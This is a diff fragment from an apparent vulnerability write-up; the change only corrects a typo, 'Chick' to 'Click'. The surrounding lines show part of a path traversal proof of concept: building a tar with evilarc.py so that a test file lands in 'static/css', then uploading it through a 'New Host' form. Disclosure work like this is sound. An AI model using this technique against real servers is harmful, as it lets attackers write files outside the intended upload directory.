@@ -283,7 +283,7 @@ echo exploitation test > test.css
 ```bash
 python2 evilarc.py  -o linux -f pay.tar test.css -p 'static/css' -d 3
 ```
-**4. Chick on "New Host" then upload the tar file "pay.tar"**
+**4. Click on "New Host" then upload the tar file "pay.tar"**
 
 **5. Check for the file.**
 
